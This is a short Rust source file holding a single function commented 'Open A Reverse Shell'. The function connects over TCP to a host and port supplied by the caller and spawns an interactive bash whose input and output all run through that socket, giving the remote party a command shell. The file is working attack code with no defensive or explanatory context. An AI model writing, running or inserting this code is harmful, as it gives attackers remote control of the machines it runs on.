use std::io::Result;
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

// Open A Reverse Shell
pub fn shell(host: String, port: String) -> Result<()> {
    let sock = TcpStream::connect(format!("{}:{}", host, port))?;
    let fd = sock.as_raw_fd();

    // Open shell
    Command::new("bash")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()?
        .wait()?;

    println!("Shell exited!");

    Ok(())
}
